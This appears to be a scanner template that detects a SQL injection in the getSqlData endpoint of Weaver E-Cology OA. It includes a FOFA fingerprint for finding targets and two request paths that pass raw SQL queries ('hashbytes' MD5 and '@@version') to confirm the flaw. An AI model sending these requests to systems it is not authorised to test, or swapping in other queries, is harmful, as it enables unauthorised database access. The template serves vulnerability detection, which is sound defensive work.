id: ecology-getsqldata-sqli

info:
  name: 泛微OA E-Cology getSqlData SQL注入漏洞
  author: zan8in
  severity: high
  verified: true
  description: |-
    fofa: header="ecology_JSessionid"
  tags: weaver,ecology,sqli
  created: 2023/06/23

set:
  num: randomInt(1000000, 9999999)
rules:
  r0:
    request:
      method: GET
      path: /Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','{{num}}')),3,32)
    expression: |
      response.body.bcontains(b'"api_status":true') && 
      response.body.bcontains(b'"status":true}') &&
      response.body.bcontains(bytes(md5(string(num))))
  r1:
    request:
      method: GET
      path: /Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version
    expression: |
      response.body.bcontains(b'"api_status":true') && 
      response.body.bcontains(b'"status":true}') &&
      response.body.ibcontains(b'Microsoft SQL Server')
expression: r0() || r1()
